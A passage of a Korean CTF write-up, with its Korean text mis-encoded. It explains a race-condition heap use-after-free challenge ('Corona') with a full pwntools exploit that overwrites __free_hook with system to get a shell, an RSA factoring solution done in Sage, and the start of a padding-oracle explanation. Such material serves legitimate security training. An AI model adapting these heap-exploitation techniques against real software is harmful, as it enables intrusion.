dele(1)

r.interactive()</code></pre><p id="7bf957ba-659d-4a85-b782-b2ef1fe88b64" class="">
</p><ul id="6e1fcb8e-bc22-4c2e-add9-2ec88a87e21c" class="bulleted-list"><li>ì¶”ê°€ì ìœ¼ë¡œ, ê°œë°œ ì‹¤ìˆ˜ë¡œ ì¸í•´ add í•¨ìˆ˜ì— í™ ë©”ëª¨ë¦¬ í• ë‹¹ ì‹œ í•´ë‹¹ ì˜ì—­ìœ¼ë¡œ ì´ˆê¸°í™”(memset ë˜ëŠ” calloc) í•˜ì§€ ì•Šì•„ <code>Uninitialized Heap</code> ë²„ê·¸ê°€ ì¡´ì¬í•˜ë‹ˆ í•´ë‹¹ ë²„ê·¸ë¥¼ ì´ìš©í•˜ì—¬ exploit í•´ë³´ëŠ”ê²ƒë„ ì¶”ì²œí•œë‹¤. </li></ul><p id="a904a9d1-430c-4c61-a189-fab738407ad1" class="">
</p><h2 id="d663832a-2820-4673-bfa9-c0e7e1ec964a" class="">Corona</h2><hr id="552c2aac-ed8c-4212-93f8-db65a57ee07a"/><figure id="5783e8bd-9fc6-478c-808c-191be64f624b" class="image"><a href="/assets/2020-09-01/bob/bob976.png"><img style="width:716px" src="/assets/2020-09-01/bob/bob976.png"/></a></figure><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="7803f804-8198-4f40-b0ff-e022e2167f0f"><div style="font-size:1.5em"><span class="icon">ğŸ’¡</span></div><div style="width:100%">race conditionì„ ì´ìš©í•œ thread heap exploit challenge.</div></figure><h3 id="c0339044-f85f-42fa-a0f2-e06cb10f6a27" class="">Challenge</h3><p id="35155f4a-e6b0-4444-bd9b-6815a32f06b6" class="">ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ë©”ë‰´ëŠ” ì•„ë˜ì™€ ê°™ë‹¤.</p><ol id="05b13ebc-f69e-488a-97b0-03581ee71dfe" class="numbered-list" start="1"><li>Create house : house structure í• ë‹¹</li></ol><ol id="f240b588-9d62-4d60-b172-127c8c684b64" class="numbered-list" start="2"><li>Edit house : house name ìˆ˜ì •</li></ol><ol id="02814321-6f2c-413a-b190-e71027919e11" class="numbered-list" start="3"><li>Add person : person structure í• ë‹¹</li></ol><ol id="377970e8-eae5-47be-b8f3-db8eca83aaf9" class="numbered-list" start="4"><li>Check status : person ìƒíƒœ ì¶œë ¥ </li></ol><ol id="0156cdf4-7f45-43cb-bedd-f3d3c89f7f39" class="numbered-list" start="5"><li>hidden : person name ìˆ˜ì • (í•œë²ˆë§Œ í˜¸ì¶œ ê°€ëŠ¥)</li></ol><p id="089a1dd0-15db-491d-8252-8020f7509383" class="">
</p><p id="da62a731-8e0f-461a-a9cd-bc5b77c8d121" class="">ë˜í•œ í”„ë¡œê·¸ë¨ì—ëŠ” ë‘ê°œì˜ threadê°€ ë™ì‘í•˜ê³  ìˆë‹¤.</p><ol id="6ed5ddd2-633f-4668-bd21-6d41775fc81d" class="numbered-list" start="1"><li>t_virus : ëœë¤(3 + rand()%8)ìœ¼ë¡œ ì‚¬ëŒì„ í•œëª… ê°ì—¼ì‹œí‚¤ê³  person chunkë¥¼ free í•œë‹¤.</li></ol><ol id="a5bc9e4e-65e0-4902-80a4-5aac9f2609bc" class="numbered-list" start="2"><li>t_day_check : 5ì´ˆì— í•œë²ˆì”© í•˜ë£¨ê°€ ì§€ë‚˜ë©° í•˜ë£¨ê°€ ì§€ë‚  ë•Œ ë§ˆë‹¤ ê°ì—¼ëœ person ê°ì²´ë¥¼ nullë¡œ ë®ì–´ì“´ë‹¤. </li></ol><p id="797ac6b1-baff-4bf2-a8df-80b1290a1b30" class="">
</p><h3 id="67640cce-9f49-46c6-b032-df9b9e8d9f72" class="">Vulnerability</h3><p id="95be14c8-55db-49cf-9ad6-f3a8f9503ff8" class="">ì·¨ì•½ì ì€ race conditionìœ¼ë¡œ, t_virus ì“°ë ˆë“œê°€ person chunkë¥¼ freeí•œ í›„ t_day_check ì“°ë ˆë“œê°€ person listë¥¼ freeí•˜ê¸° ì „ì— freeëœ person ì— ì ‘ê·¼í•˜ë©´ Use-After-Free ì·¨ì•½ì ì´ ë°œìƒí•œë‹¤.</p><p id="13882f90-e58c-4636-8f4e-4bc00e69c959" class="">
</p><h3 id="41134812-b32f-41e7-9515-be22aa27ec88" class="">Exploit</h3><p id="5dfb5d0c-e660-4ad1-b017-1441e2a607f7" class="">exploitì— ì•ì„œ ì´ ë¬¸ì œë¥¼ ìµœëŒ€í•œ ë¹ ë¥´ê²Œ exploití•˜ê¸° ìœ„í•´ ì•Œê³ ìˆì–´ì•¼í•˜ëŠ” ë‘ê°€ì§€ê°€ ìˆë‹¤.</p><ol id="10dd2a45-ee60-4087-972f-244beeadd4df" class="numbered-list" start="1"><li>ë°”ì´ë„ˆë¦¬ì—ì„œ chunkë¥¼ freeí•˜ëŠ”ê²Œ ììœ ë¡­ì§€ ì•Šë‹¤. t_virus threadê°€ ëœë¤ìœ¼ë¡œ freeí•˜ëŠ”ë°, listì— chunkê°€ ì—†ì„ ê²½ìš° freeë˜ì§€ ì•Šì„ ìˆ˜ë„ ìˆë‹¤. ë”°ë¼ì„œ chunkë¥¼ ìµœëŒ€í•œ ë†’ì€ í™•ë¥ ë¡œ freeì‹œí‚¤ê¸° ìœ„í•´ì„œëŠ” ëª¨ë“  houseì— personì„ ì „ë¶€ ì±„ìš°ê³  free ë  ë•Œ ì¶œë ¥ë˜ëŠ” ë©”ì„¸ì§€ë¡œ ì–´ë–¤ ì²­í¬ê°€ freeëœê±´ì§€ êµ¬ë¶„í•˜ëŠ”ê²Œ ì¢‹ë‹¤ (<code>printf(&quot;\n%s was infected ...\n&quot;, house_list[rd]-&gt;list[i]-&gt;name);</code>)
ê·¸ë˜ì„œ exploitì„ ì‘ì„±í•  ë•Œë„ íŠ¹ìˆ˜í•œ chunkê°€ freeë˜ëŠ”ê±¸ ê°€ì •í•˜ê¸° ë³´ë‹¤, ë‹¨ìˆœíˆ chunkê°€ freeë˜ëŠ” ì‚¬ì‹¤ì„ ì´ìš©í•´ ì½”ë“œë¥¼ ì‘ì„±í•´ì•¼ í•œë‹¤. ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ ëœë¤ ë•Œë¬¸ì— ë””ë²„ê¹…ì´ ë§¤ìš° í˜ë“¤ê³  exploitì„ ì™„ì„±í•˜ëŠ”ë° ì˜¤ëœ ì‹œê°„ì´ ê±¸ë¦´ ê²ƒì´ë‹¤.</li></ol><ol id="7a4a86da-6548-47b4-83bc-5fd6476239f6" class="numbered-list" start="2"><li>raceë¥¼ ë‚´ëŠ” ì‹œê°„ì´ ë„ˆë¬´ ê¸¸ë‹¤. t_day_checkê°€ 5ì´ˆì´ê³  t_virusê°€ (rand()%8 + 3)ì´ˆì¸ë° ì‚¬ì‹¤ìƒ chunk í•˜ë‚˜ê°€ freeë˜ê¸° ìœ„í•´ì„œëŠ” ìµœì†Œ 3ì´ˆë¥¼ ê¸°ë‹¤ë ¤ì•¼í•œë‹¤ëŠ” ë§ì´ ëœë‹¤. ë¬¸ì œë¥¼ í’€ ë•ŒëŠ” ë°”ì´ë„ˆë¦¬ íŒ¨ì¹˜ë¡œ ì´ ê°’ì„ ì§§ê²Œ ì¤„ì—¬ì„œ exploití•´ì•¼ ë””ë²„ê¹…í•˜ëŠ”ë° ì‹œê°„ì„ ìµœì†Œí™”í•  ìˆ˜ ìˆë‹¤.</li></ol><p id="5430977e-4d7b-4403-b881-c1154aac6c86" class="">ì•„ë§ˆ ìœ„ ë‘ê°€ì§€ë¥¼ ì•ˆí–ˆë‹¤ë©´ ë””ë²„ê¹…ì´ ë§¤ìš° ë¶ˆí¸í–ˆì„ ê²ƒì´ë‹¤. ë‹¤ìŒì€ ì‹¤ì œë¡œ exploití•˜ëŠ” ìˆœì„œì´ë‹¤.</p><ol id="d7a3cd7f-7d0c-48eb-8e01-dedb21ec0b4e" class="numbered-list" start="1"><li>5ì¼ì§¸ì— libc leakì„ ì œê³µí•´ ì¤€ë‹¤.</li></ol><ol id="fc224b9e-6f50-4369-8a4e-61cc5e69e51a" class="numbered-list" start="2"><li>t_virusë¡œ 8ê°œì˜ chunkë¥¼ freeí•œë‹¤. (7ê°œì˜ chunkëŠ” tcacheì— ì €ì¥ë˜ë©° ë§ˆì§€ë§‰ chunkëŠ” fastbinì— ì €ì¥ëœë‹¤.)</li></ol><ol id="a8fa21ce-c162-47ee-860f-61a42d3c97f6" class="numbered-list" start="3"><li>hidden ë©”ë‰´ë¥¼ ì´ìš©í•´ fastbin chunkì˜ fdë¥¼ free hook - 0x10ìœ¼ë¡œ ëŒë¦°ë‹¤. (race condition íŠ¸ë¦¬ê±°)</li></ol><ol id="552e81fb-74b4-4e5b-80c0-753385449d9c" class="numbered-list" start="4"><li>ë™ì¼í•œ ì‚¬ì´ì¦ˆì˜ ì²­í¬ë¥¼ í•˜ë‚˜ ë” í• ë‹¹í•˜ë©´ fastbin chunkë¥¼ tcache bin ìœ¼ë¡œ ì˜®ê¸´ë‹¤. </li></ol><ol id="5ac3cbfa-62e5-40d7-98e5-d68d01aa14aa" class="numbered-list" start="5"><li>tcache binì— ìˆëŠ” chunkë¥¼ í• ë‹¹ë°›ì•„ free_hookì— ì›í•˜ëŠ” ê°’ì„ ì“´ë‹¤.</li></ol><ol id="59ccc5ad-5045-4c71-b914-cc319e1a8f81" class="numbered-list" start="6"><li>person nameì— /bin/shë¥¼ ë„£ì–´ t_virusê°€ chunkë¥¼ freeí•  ë•Œ shellì„ íšë“í•œë‹¤. </li></ol><p id="9d88b57c-f02a-472a-b383-9e17d35df419" class="">
</p><h3 id="a86d4353-0672-4f7b-aa82-4d17fe4c4c34" class="">Note</h3><p id="f2722f26-52bf-423c-8267-fd7a572be525" class="">ì‚¬ì‹¤ ì´ ë¬¸ì œë¥¼ ì²˜ìŒ ê¸°íší–ˆì„ë•Œ í•µì‹¬ì ì¸ ë‚´ìš©ì€ libc ì£¼ì†Œë¥¼ leakí•˜ëŠ” ë¶€ë¶„ì´ì—ˆë‹¤. ë‹¤ë§Œ libcë¥¼ leakí•˜ëŠ” ë°©ë²•ì´ ìƒê°ë³´ë‹¤ ë„ˆë¬´ ì–´ë ¤ì›Œì ¸ì„œ ì´ê²ƒê³¼ í•¨ê»˜ tcache bin trickì„ ê°™ì´ ë‚¸ë‹¤ë©´ í‘¸ëŠ”ë° ë„ˆë¬´ ë§ì€ ì‹œê°„ì´ ê±¸ë¦´ê²ƒì´ë¼ íŒë‹¨í–ˆë‹¤. ê·¸ë˜ì„œ libc ì£¼ì†Œë¥¼ ì£¼ëŠ” ë°©í–¥ìœ¼ë¡œ ë¬¸ì œë¥¼ ë³€ê²½í–ˆê³ , exploitì—ì„œ ì•ˆì“°ëŠ” edit house ë©”ë‰´ê°€ ìˆëŠ” ì´ìœ ë„ leakì„ ì£¼ëŠ”ê±¸ë¡œ íŒ¨ì¹˜í•´ì„œ ê·¸ë ‡ë‹¤. (í•˜ì§€ë§Œ ì§€ê¸ˆ ë¬¸ì œì—ì„œë„ libc leakì„ í•  ìˆ˜ ìˆìœ¼ë‹ˆ ë„ì „í•´ë³´ê³  ì‹¶ìœ¼ì‹  ë¶„ë“¤ì€ ë„ì „í•´ ë³´ì‹œê¸¸..)</p><p id="03a4ff7c-f969-4283-829a-2fe1973bc79f" class="">ê·¸ë¦¬ê³  exploitì˜ í•µì‹¬ì ì¸ ë‚´ìš© ì¤‘ì— tcache ê´€ë ¨ íŠ¸ë¦­ì´ ìˆëŠ”ë°, ì‚¬ì‹¤ ì´ê²ƒì€ ê³µê°œì ìœ¼ë¡œ ì•Œë ¤ì§€ê±°ë‚˜ í”íˆ ì‚¬ìš©ë˜ëŠ” íŠ¸ë¦­ì€ ì•„ë‹Œ ë§Œí¼ fastbin binì— ìˆëŠ” chunkê°€ tcacheìœ¼ë¡œ ì˜®ê²¨ì§„ë‹¤ëŠ” ì‚¬ì‹¤ì„ ëª¨ë¥´ëŠ” ë¶„ë“¤ì´ ë§ì„ ê²ƒì´ë¼ ìƒê°í–ˆë‹¤. íŠ¹íˆ CTFì—ì„œ heap ê´€ë ¨ ë¬¸ì œëŠ” ëª¨ë¥´ëŠ” íŠ¸ë¦­ì´ ë‚˜ì™€ ê³ ìƒí•˜ëŠ” ê²½ìš°ê°€ ë§ì€ë°, ì´ ë¬¸ì œì—ì„œëŠ” íŠ¸ë¦­ì„ ëª°ë¼ë„ ìì—°ìŠ¤ëŸ½ê²Œ ë¬¸ì œë¥¼ í’€ ìˆ˜ ìˆë„ë¡ ìµœëŒ€í•œ ìœ ë„í–ˆë‹¤.</p><p id="60c2a61f-c282-4ff8-8301-a94c59f01726" class="">ê·¸ ë¶€ë¶„ì´ ë°”ë¡œ Person chunkë¥¼ 0x70 ì‚¬ì´ì¦ˆì˜ chunkë¡œ ì¤¬ë‹¤ëŠ” ì‚¬ì‹¤ì¸ë°, exploitì—ì„œ tcache bin íŠ¸ë¦­ì„ ì‚¬ìš©í•˜ë©´ ì‚¬ì´ì¦ˆì™€ëŠ” ìƒê´€ ì—†ì´ ì›í•˜ëŠ” ì£¼ì†Œë¥¼ ë®ì–´ ì“¸ ìˆ˜ ìˆë‹¤. í•˜ì§€ë§Œ ì´ ì‚¬ì‹¤ì„ ëª¨ë¥´ëŠ” ë¶„ë“¤ì€ ì´ë¯¸ í”í•˜ê²Œ ì•Œë ¤ì§„ 0x70 fastbin chunkì˜ fdë¥¼ ë®ì–´ __malloc_hookì„ ë®ì–´ì“°ëŠ” exploitì„ ìƒê°í–ˆì„ ê²ƒì´ë‹¤. ë§Œì•½ ì´ëŸ° ìƒê°ì„ í†µí•´ exploitì„ ì‘ì„±í–ˆë‹¤ í•˜ë”ë¼ë„ __malloc_hookì„ ë®ì–´ì“°ëŠ” ê³¼ì •ì—ì„œ ìì—°ìŠ¤ëŸ½ê²Œ fastbin chunkê°€ tcache binìœ¼ë¡œ ì˜®ê²¨ì§€ëŠ” ì‚¬ì‹¤ì„ í™•ì¸í•  ìˆ˜ ìˆì„ ê²ƒì´ë‹¤. ì—¬ê¸°ì„œ ì¢€ë§Œ ë” ë””ë²„ê¹…ì„ í•˜ë‹¤ ë³´ë©´ exploitì„ ì™„ì„±í•  ìˆ˜ ìˆë„ë¡ ë¬¸ì œë¥¼ ì„¤ê³„í–ˆë‹¤. ê·¸ë˜ì„œ ì´ ë¬¸ì œë¥¼ í‘¸ëŠ” ëª¨ë“  ë¶„ë“¤ì´ ëª¨ë¥´ë©´ ëª»í‘¸ëŠ” íŠ¸ë¦­ë¬¸ì œë¼ê³  ìƒê°í•˜ì§€ ì•Šì•˜ìœ¼ë©´ ì¢‹ê² ë‹¤ëŠ” ë§ˆìŒìœ¼ë¡œ ìµœëŒ€í•œ ìµìŠ¤ ìœ ë„ë¥¼ í•´ë´¤ë‹¤.</p><p id="ce34f6c4-508d-4183-86bd-4e6a213f7ab0" class="">
</p><h3 id="665ae0e6-c8f1-4b45-9720-5e91165a4565" class="">Exploit Code</h3><p id="f530bb7c-3cae-450e-9bad-bec43cb90e69" class="">ì‹¤ìˆ˜ë¡œ ë¬¸ì œ ì½”ë“œì™€ exploitì„ ë‹¤ ë‚ ë ¤ë²„ë¦° ë°”ëŒì—,, ë¬¸ì œë¥¼ í¬ë¡œìŠ¤ ì²´í‚¹ í•´ì£¼ì‹  í•µì‹¬ì—°êµ¬íŒ€ ê¹€ë™ë¯¼ë‹˜(@gpsfly) ìµìŠ¤ë¥¼ ì²¨ë¶€í•œë‹¤.</p><pre id="234fb01c-1d4d-458b-8cb1-4c1de51cb73f" class="code"><code>from pwn import *
import sys

bi = &#x27;./bin.elf&#x27;
#r = process([bi])
r = remote(&#x27;bob.lordofpwn.kr&#x27;, 31337)
context.terminal = [&#x27;tmux&#x27;, &#x27;new-window&#x27;]
sla = r.sendlineafter
sa = r.sendafter
p = pause
dbg = gdb.attach
e = ELF(bi)
l = ELF(&#x27;libc&#x27;) # remote
#l = ELF(&#x27;libc.so.6&#x27;) # local

sc = &#x27;&#x27;&#x27;
heap-analysis-helper
c
&#x27;&#x27;&#x27;
if len(sys.argv) &gt; 1:
    dbg(r, sc)

xla = lambda x : sla(&#x27;&gt;&gt; &#x27;, str(x))
xa = lambda x : sa(&#x27;&gt;&gt; &#x27;, str(x))
create = lambda name : [xla(1), xa(name)]
edit = lambda idx,name : [xla(2), xla(idx), xa(name)]
add = lambda idx,name,age,height : [xla(3), xla(idx), xa(name), xla(age), xla(height)]
check = lambda idx : [xla(4), xla(idx)]
hidden = lambda hidx,pidx,name : [xla(31337), xla(hidx), xla(pidx), xa(name)]

for i in range(7):
    create(&#x27;/bin/sh&#x27;)
    for j in range(8):
        add(i, &#x27;{}_{};/bin/sh&#x27;.format(i,j), 1, 1)

cnt = 0
while True:
    data = r.recvline().strip()
    if &#x27;The gift&#x27; in data:
        libc = int(data.split(&#x27; : &#x27;)[1], 16) - l.sym[&#x27;printf&#x27;]
        log.info(&quot;libc @ {}&quot;.format(hex(libc)))
    elif &#x27;infected&#x27; in data:
        cnt += 1
        print(cnt, data)
        if cnt == 8:
            i, j = data.split(&#x27; was &#x27;)[0].split(&#x27;;&#x27;)[0].split(&#x27;_&#x27;)
            r.sendline(&#x27;5&#x27;)
            hidden(i, j, p64(libc+l.sym[&#x27;__free_hook&#x27;]-0x10)) #free_hook-0x10
            create(&#x27;A&#x27;*0x60)
            add(i, p64(libc+l.sym[&#x27;system&#x27;]), 1, 1) #system
            edit(0, &#x27;X&#x27;)
            break

r.interactive()</code></pre><p id="f8b0e00a-3c78-4c60-983e-a404d3ffe4ab" class="">
</p><h1 id="f29fa220-8c9a-49a5-8b93-7ba1ea220b93" class="">ğŸ–¥ï¸ CRYPTO</h1><h2 id="e30d6697-49a2-40cc-956b-dbd6fea02623" class="">Easy RSA</h2><hr id="b3673360-d14c-4664-b4bf-b7f1203bb941"/><figure id="c1cd37e1-76f2-4b79-b060-97148efccf9f" class="image"><a href="/assets/2020-09-01/bob/bob977.png"><img style="width:710px" src="/assets/2020-09-01/bob/bob977.png"/></a></figure><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="030f4d65-e819-4a46-8562-deaeff9473b1"><div style="font-size:1.5em"><span class="icon">ğŸ’¡</span></div><div style="width:100%">Easy polynomial factoring</div></figure><ul id="1bf674ac-7a7b-47e9-88a1-6bf87e8290f4" class="bulleted-list"><li>ë¬¸ì œì—ì„œëŠ” ê³µê°œí‚¤ë§Œ ì œê³µëœë‹¤. ì¦‰ ì´ ë¬¸ì œì—ì„œëŠ” Nì„ factorizationí•˜ëŠ” ê²Œ ëª©í‘œì´ë‹¤.</li></ul><ul id="3375a10c-ac4f-4e6b-8f40-f73a2c49b8a7" class="bulleted-list"><li>codeì—ì„œ Nì˜ ê°’ì„ 13ì§„ë²•ìœ¼ë¡œ ì‚´í´ë³´ë¼ëŠ” íŒíŠ¸ê°€ ì£¼ì–´ì¡Œë‹¤.</li></ul><ul id="e6d16a96-0b97-4a12-912c-23b81255c8c0" class="bulleted-list"><li>Nì„ base 13ìœ¼ë¡œ ì‚´í´ë³´ë©´ ì•„ë˜ì™€ ê°™ë‹¤.</li></ul><p id="21ca0fea-1022-48c6-b82c-37390d6a0737" class=""><code>1100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013a41000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000019bba2</code></p><ul id="749d4e73-4c28-4b2d-9253-494bc6c910ea" class="bulleted-list"><li>ì´ë¥¼ ë‹¤í•­ì‹ìœ¼ë¡œ ë‚˜íƒ€ë‚´ë©´ ì•„ë˜ì™€ ê°™ë‹¤.</li></ul><p id="33e9d772-8a62-4cea-adeb-e9e4ea042bed" class=""><code>x^400 + x^399 + x^203 + 3</code><code><em>x^202 + 10</em></code><code>x^201 + 4</code><code><em>x^200 + x^199 + x^5 + 9</em></code><code>x^4 + 11</code><code><em>x^3 + 11</em></code><code>x^2 + 10*x + 2 (x=13)</code></p><ul id="e140ff76-11a9-4877-85bd-6f82c83613af" class="bulleted-list"><li>sageì—ì„œ í•´ë‹¹ ë‹¤í•­ì‹ì„ <code>poly.factor()</code>ë¡œ factorizationí•˜ë©´ pì™€ që¥¼ êµ¬í•  ìˆ˜ ìˆë‹¤.</li></ul><p id="5c7f72c2-e3ac-4a51-88cb-d594d3afe7ba" class="">
</p><p id="8212a2f0-327d-4a7e-870c-63dd95c8e347" class=""><strong>Exploit Code</strong></p><pre id="cd451fd8-14d7-4d86-b80b-c3b31b9e1de1" class="code"><code>sage: N = 4069355261174518447044221465092549731956949577068389562886621536859114995157407396913103746675307806861475505196604075690189887011157213
....: 06579441204391802579988679325559464933524679569288946633797366876605906618330862289486089133036525973648043594211930902803789362401571187621
....: 75215559436614871795165204002781471609204034064252028413035000407848466271441883438192490960762478416146403426890827177153457241880068131862
....: 173969477923674349247844851493
sage: 
sage: N.str(base=13)
&#x27;1100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013a41000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000019bba2&#x27;
sage: poly = sum(e * x^i for i,e in enumerate(N.digits(13)))
sage: 
sage: poly
x^400 + x^399 + x^203 + 3*x^202 + 10*x^201 + 4*x^200 + x^199 + x^5 + 9*x^4 + 11*x^3 + 11*x^2 + 10*x + 2
sage: poly.factor()
  ***   Warning: increasing stack size to 2000000.
(x^200 + x^199 + x^2 + 8*x + 2)*(x^200 + x^3 + x^2 + x + 1)
sage: p = 13^200 + 13^199 + 13^2 + 8*13 + 2
sage: q = 13^200 + 13^3 + 13^2 + 13 + 1</code></pre><h2 id="5fcac5aa-b6c9-40bb-ba44-b93aa3fe652e" class="">Boom Boom</h2><hr id="fdf45155-38d9-4ac0-b572-ff3f92e6c98c"/><figure id="5d7fb1f2-08fd-48e6-811c-34941edb0fe1" class="image"><a href="/assets/2020-09-01/bob/bob978.png"><img style="width:716px" src="/assets/2020-09-01/bob/bob978.png"/></a></figure><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="cb3ccbd3-c6cc-4fa2-b566-160cf29012d2"><div style="font-size:1.5em"><span class="icon">ğŸ’¡</span></div><div style="width:100%">Oracle Padding Attack</div></figure><figure id="74b11c57-88f8-46b8-b45c-884363444fc0" class="image"><a href="/assets/2020-09-01/bob/bob979.png"><img style="width:952px" src="/assets/2020-09-01/bob/bob979.png"/></a></figure><p id="f9199a05-7816-4dc0-9b58-691d40ba4773" class=""><mark class="highlight-red_background"><strong>ë¬¸ì œí™•ì¸</strong></mark></p><blockquote id="e7c13afa-8a3f-4258-80b3-87fca747d3ec" class="">í…ŒëŸ¬ë‹¨ì²´ì—ì„œ í­íƒ„í…ŒëŸ¬ê°€ ìˆì„ ì˜ˆì •ì´ë¼ëŠ” ì²©ë³´ë¥¼ ì…ìˆ˜í–ˆë‹¤....(ìƒëµ)... ì•”í˜¸ë¬¸ì„ ë³µí˜¸í™”í•˜ê³  ì•”í˜¸ í•´ì œ ë¹„ë°€ë²ˆí˜¸ë¥¼ íšë“í•´ë¼!</blockquote><ul id="33af78f1-6a08-4b7f-a57f-7c8c14a85172" class="bulleted-list"><li>ë¬¸ì œì— ì ‘ì†í•˜ë©´ ë©”ì‹œì§€ì™€ í•¨ê»˜ IVì™€ Ciphertextë¥¼ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li></ul><ul id="d311e82f-5db2-4cce-8724-2d2cab5654c2" class="bulleted-list"><li>í˜ì´ì§€ì— ìƒˆë¡œ ì ‘ì†í•  ë•Œë§ˆë‹¤ ìƒˆë¡œìš´ IVì™€ Ciphertextë¥¼ ì¶œë ¥í•´ì¤€ë‹¤.</li></ul><p id="fd320cb7-d7d9-4576-b8cc-6add37523e57" class="">
</p><p id="8686d6e1-012b-414c-8e9f-951db22c1135" class=""><mark class="highlight-red_background"><strong>ê¸°ëŠ¥í™•ì¸</strong></mark></p><figure id="747a631c-1a67-4fbd-99ee-ec83b6a3246a" class="image"><a href="/assets/2020-09-01/bob/bob980.png"><img style="width:952px" src="/assets/2020-09-01/bob/bob980.png"/></a></figure><ul id="71a7122f-0081-4a54-9ace-16ad8ea98727" class="bulleted-list"><li><code>Module</code> í˜ì´ì§€ì—ì„œëŠ” <code>IV</code>ì™€ <code>Ciphertext</code>ë¥¼ ì…ë ¥í•  ìˆ˜ ìˆë‹¤.</li></ul><p id="6caf420a-62bb-4b51-8e2e-02be7e795a90" class="">
</p><figure id="59c28394-d180-45c3-a233-776fa2c785ab" class="image"><a href="/assets/2020-09-01/bob/bob981.png"><img style="width:952px" src="/assets/2020-09-01/bob/bob981.png"/></a></figure><ul id="160dec38-363b-4615-8ebb-66d6291389dc" class="bulleted-list"><li><code>Flag</code> í˜ì´ì§€ì—ì„œëŠ” <code>Passcode</code>ë¥¼ ì…ë ¥í•  ìˆ˜ ìˆë‹¤. ì˜¬ë°”ë¥¸ <code>Passcode</code>ë¥¼ ì…ë ¥í•˜ë©´ <code>FlAG</code>ë¥¼ ì¶œë ¥í•œë‹¤.</li></ul><p id="592a60bb-c3d9-4207-af9c-2a7f3ccee51f" class="">
</p><p id="e09f24d2-ab52-47d5-aa3a-60b931276d4f" class=""><mark class="highlight-red_background"><strong>ë¶„ì„</strong></mark></p><ul id="3f74d406-de1b-4c63-9e87-7e2b6dd1ae94" class="bulleted-list"><li>Module í˜ì´ì§€ì—ì„œëŠ” ì´ 3ê°€ì§€ì˜ ì‘ë‹µì´ ì¡´ì¬í•œë‹¤.</li></ul><figure id="3c0a2c42-f2c5-441d-99ee-861848cbb43c" class="image"><a href="/assets/2020-09-01/bob/bob982.png"><img style="width:952px" src="/assets/2020-09-01/bob/bob982.png"/></a></figure><p id="911eef9d-c329-45e0-b05d-fa4076d3afb5" class=""><strong>1) Invalid padding</strong><div class="indented"><ul id="8b067b7f-a3a9-48fe-b2d8-54a525124aee" class="bulleted-list"><li>IVê°€ ì•Œë§ì§€ ì•Šì„ ê²½ìš° ë°œìƒ(Padding error)</li></ul></div></p><p id="6f1b9238-bdf0-4983-a7b4-b051f7e3dabf" class="">
</p><figure id="e978b750-f7a4-4d07-bc4f-5426b12d21ef" class="image"><a href="/assets/2020-09-01/bob/bob983.png"><img style="width:952px" src="/assets/2020-09-01/bob/bob983.png"/></a></figure><figure id="3f80f806-f6d8-43a6-812d-b4b9d499ad9f" class="image"><a href="/assets/2020-09-01/bob/bob984.png"><img style="width:1366px" src="/assets/2020-09-01/bob/bob984.png"/></a></figure><p id="7e01af8b-efce-475e-938d-9e78a0f91327" class=""><strong>2) incoreect!</strong><div class="indented"><ul id="94e9f9af-a045-4bc4-b6c5-26512764d212" class="bulleted-list"><li>Paddingì€ ì•Œë§ê²Œ ì±„ì›Œì§„ ê²½ìš°</li></ul></div></p><p id="d49c5462-d434-42c8-82ec-2a7b5ec9a808" class="">
</p><figure id="cfe2cdf0-5ba7-471a-814b-89efcc7d6ec6" class="image"><a href="/assets/2020-09-01/bob/bob985.png"><img style="width:952px" src="/assets/2020-09-01/bob/bob985.png"/></a></figure><p id="e37948c5-dfb4-4b9f-a108-da5d1041d3e3" class=""><strong>3) correct!</strong><div class="indented"><ul id="be04c109-c2ae-4bd6-931c-002320be84d3" class="bulleted-list"><li>IVì™€ Ciphertext ëª¨ë‘ ì•Œë§ì„ ê²½ìš° ë°œìƒ</li></ul></div></p><p id="82ec1356-7511-42ee-a004-c43bd3d1d7d8" class="">
</p><p id="7e29cf79-7ee0-4483-a40c-e2bbe3e25e74" class=""><strong><mark class="highlight-red_background">Oracle Padding Attack ê°œë…</mark></strong></p><ul id="dce3123a-c43d-4e4d-a067-ff054220f056" class="bulleted-list"><li>ì·¨ì•½ì  ì„¤ëª…<ul id="22a2d892-9893-4280-83c4-38721f3487cb" class="bulleted-list"><li>ë¸”ë¡ì•”í˜¸ì—ì„œ ì‚¬ìš©ë˜ëŠ” íŒ¨ë”©ì´, ì˜¬ë°”ë¥¸ì§€ ì˜¬ë°”ë¥´ì§€ ì•Šì€ì§€ì— ë”°ë¼ ì„œë²„ì˜ ì‘ë‹µì´ ë‹¬ë¼ì§ˆ ê²½ìš° ì´ë¥¼ í†µí•´ ê³µê²©ì„ ìˆ˜í–‰ í•  ìˆ˜ ìˆë‹¤.</li></ul></li></ul><p id="4236a5f7-0792-4ecc-a050-82723d44f8ed" class="">
</p><ul id="12ec4409-a26b-4a4c-b9a7-a349ce2037c6" class="bulleted-list"><li>íŒ¨ë”©ì´ë€?<ul id="4ddb66da-f878-45ed-b435-f7a2e935b41d" class="bulleted-list"><li>ë¸”ë¡ ì•”í˜¸í™”í•´ì„œ ì‚¬ìš©í•˜ëŠ” ê²ƒìœ¼ë¡œ, ì¼ì • ë‹¨ìœ„ë¡œ ë¸”ë¡ì„ ìë¥¼ë•Œ ë§ˆì§€ë§‰ ë¸”ë¡ì— ì• ë¸”ë¡ê³¼ ê°™ì€ ê¸¸ì´ë¡œ ë§Œë“¤ì–´ì£¼ê¸° ìœ„í•´ ë‚¨ëŠ” ê³³ì€ íŒ¨ë”©ìœ¼ë¡œ ì±„ìš´ë‹¤.</li></ul><figure id="cd1f4d05-dacc-43ff-869b-3bac57acf342" class="image"><a href="/assets/2020-09-01/bob/bob986.png"><img style="width:1156px" src="/assets/2020-09-01/bob/bob986.png"/></a></figure><ul id="a1a63b26-3f6e-4969-9be0-af65f19689b8" class="bulleted-list"><li>ì˜¤ë¼í´ 